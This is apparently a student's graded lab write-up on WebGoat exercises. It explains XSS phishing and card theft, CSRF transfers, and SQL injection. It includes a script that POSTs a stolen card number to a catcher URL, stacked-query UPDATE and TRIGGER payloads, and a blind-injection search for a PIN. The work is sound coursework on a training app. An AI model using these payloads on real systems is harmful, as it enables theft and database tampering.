#Zihan Zhao, 1001103708, simon.zhao@mail.utoronto.ca
#Hao Wang, 1001303500, ternal.wang@mail.utoronto.ca


Part 1 Explanation:
First I would let the user search my script. My script would create a user name and password interface by user's search. After user typed their user name and password if they clicked the submit button that information would be sent to the attacker's server.

The vulnerability is when users search for something that thing could be displayed by the HTML. Therefore we can write some HTML script that would be executed by the HTML.

After the user clicks the search button and sees the login interface, they would mistakenly think it is required for their search.


Part 2 Explanation:
The decoded URL is as following:
"
http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1=123&input2=<script>
var card_arr = document.getElementsByName("input1");
var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value; 
var xmlHTTP = new XMLHttpRequest(); 
xmlHTTP.open("POST",credURL, false); 
xmlHTTP.send(null);
var message = document.getElementById('message');
message.innerHTML =  "";
</script>
"
The entry that lets the user input their three-digit number is exploitable. We create the script into that input. After the user typed their information and click the purchase button. Our script would be executed which would send their information to the attacker's server. 


Part 3 Explanation:
We created a image which has a special URL. The URL have screen = 423096428 and menu = 900. The URL would transfer 5000$ from the user when the user open the image.


Part 4 Explanation:
We would let the message first go to the transfer URL. When the URL was accessed we would change this URL to an other URL that make transfer=CONFIRMED which would confirm this transfer.


Part 5 Explanation:
We would let the message first go to the transfer URL. When the URL was accessed we could find the token value in that webpage. And then we would change this URL to another URL that contains the transfer value and token value in the end which would finish the transfer.


Part 6 Explanation:
SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. If I input (' or '1'='1) then the SQL language would become (SELECT * FROM user_data WHERE last_name = '' or '1'='1') this is always true and we can access all the user's information.


Part 7 Explanation:
SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
If we input (101; UPDATE employee SET salary = 555000 WHERE userid = 101) then the SQL language would become (select userid, password, ssn, salary, email from employee where userid=101; UPDATE employee SET salary = 555000 WHERE userid = 101) which would change employee 101's salary.
If we input (101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid) then the SQL language would become (select userid, password, ssn, salary, email from employee where userid=101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid) which would change new employees' email.


Part 8 Explanation:
SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
We can use the following input (101 AND ((select pin from credit where cc_number = 1234123412341234) > <Nnumber2>)) to test where Number2 is 0, 10, 100 , 1000, and 10000...
And then we find it would change from valid to invalid when Nnumber2 is 10000.
Then we would use the following two input to do the binary search.
101 AND ((select pin from credit where cc_number = 1234123412341234) < <Nnumber1>)
101 AND ((select pin from credit where cc_number = 1234123412341234) > <Nnumber2>)
After finding 4862, check by the input:
101 AND ((select pin from credit where cc_number = 1234123412341234) = 4862)
